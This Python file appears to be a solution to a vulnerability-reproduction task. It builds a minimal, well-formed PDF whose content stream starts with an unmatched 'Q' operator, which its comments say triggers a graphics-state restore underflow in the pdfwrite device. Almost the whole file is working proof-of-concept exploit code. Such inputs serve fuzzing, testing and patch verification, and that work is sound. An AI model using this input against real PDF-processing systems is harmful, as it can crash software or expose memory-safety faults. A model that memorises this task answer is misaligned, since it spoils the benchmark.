import os
import tarfile
from typing import List, Tuple


def _build_pdf_with_stream(stream_data: bytes) -> bytes:
    # Minimal, well-formed PDF with one page and a single content stream.
    # The stream is crafted to start with an unmatched 'Q' operator.
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> /Contents 4 0 R >>\nendobj\n"
    obj4 = (
        b"4 0 obj\n<< /Length "
        + str(len(stream_data)).encode("ascii")
        + b" >>\nstream\n"
        + stream_data
        + (b"" if stream_data.endswith(b"\n") else b"\n")
        + b"endstream\nendobj\n"
    )

    parts: List[bytes] = [header]
    offsets = [0] * 5

    cur = len(header)

    offsets[1] = cur
    parts.append(obj1)
    cur += len(obj1)

    offsets[2] = cur
    parts.append(obj2)
    cur += len(obj2)

    offsets[3] = cur
    parts.append(obj3)
    cur += len(obj3)

    offsets[4] = cur
    parts.append(obj4)
    cur += len(obj4)

    xref_pos = cur
    xref_lines = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
    for i in range(1, 5):
        xref_lines.append(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
    xref = b"".join(xref_lines)

    trailer = (
        b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n"
        + str(xref_pos).encode("ascii")
        + b"\n%%EOF\n"
    )

    return b"".join(parts) + xref + trailer


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Primary guess: PDF content stream with unmatched 'Q' triggers viewer-state restore underflow in pdfwrite.
        # Keep the remainder of the stream valid so fixed versions can continue cleanly.
        stream = b"Q\nq\n0 0 10 10 re\nf\nQ\n"
        return _build_pdf_with_stream(stream)